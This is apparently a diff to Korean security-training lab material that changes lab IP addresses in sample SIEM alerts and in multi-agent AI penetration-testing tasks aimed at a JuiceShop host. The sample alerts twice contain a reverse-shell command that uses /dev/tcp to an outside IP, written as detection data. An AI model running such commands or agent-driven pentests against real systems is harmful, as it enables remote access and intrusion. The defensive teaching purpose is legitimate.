@@ -272,7 +272,7 @@ def analyze_alert(alert_text: str) -> dict:
 # 테스트 경보 데이터
 test_alerts = [
     "rule_id=5710, src=185.220.101.34, dst=siem, count=234, time=04:12",
-    "rule_id=31104, src=10.20.30.80, path=/api/users, method=DELETE, status=200, count=1",
+    "rule_id=31104, src=10.20.32.80, path=/api/users, method=DELETE, status=200, count=1",
     "rule_id=87901, src=unknown, process=nc, port=4444, user=www-data",
 ]
 
@@ -341,7 +341,7 @@ def analyze_with_cot(incident: str) -> str:
 scenarios = [
     """사고 보고:
 - Wazuh 경보: rule.id 87901 (Reverse Shell 탐지)
-- 출발지: web 서버 (10.20.30.80)
+- 출발지: web 서버 (10.20.32.80)
 - 프로세스: /bin/bash -i >& /dev/tcp/45.33.32.156/4444 0>&1
 - 실행 사용자: www-data
 - 시간: 2026-03-30 03:22:15 KST""",
@@ -424,7 +424,7 @@ cat > ~/lab/week03/sample_alerts.json << 'JSONEOF'
     "timestamp": "2026-03-30T02:33:41+09:00",
     "rule": {"id": "87901", "description": "Possible reverse shell detected.", "level": 12},
     "agent": {"id": "002", "name": "web"},
-    "data": {"srcip": "10.20.30.80", "command": "bash -i >& /dev/tcp/45.33.32.156/4444 0>&1", "user": "www-data"},
+    "data": {"srcip": "10.20.32.80", "command": "bash -i >& /dev/tcp/45.33.32.156/4444 0>&1", "user": "www-data"},
     "location": "/var/ossec/logs/active-responses.log"
   }
 ]
@@ -874,7 +874,7 @@ async def main():
     )
     
     await Console(team.run_stream(
-        task="10.20.30.80:3000 (JuiceShop) 모의해킹 + 한국어 보고서"
+        task="10.20.40.81:3000 (JuiceShop) 모의해킹 + 한국어 보고서"
     ))
 
 asyncio.run(main())
@@ -952,7 +952,7 @@ reporter = Agent(
 
 # === Tasks ===
 task1 = Task(
-    description="10.20.30.80 정찰 — 포트, 서비스, 기술 스택 식별",
+    description="10.20.32.80 정찰 — 포트, 서비스, 기술 스택 식별",
     agent=recon,
     expected_output="발견된 서비스 목록 (포트, 버전, 기술)"
 )
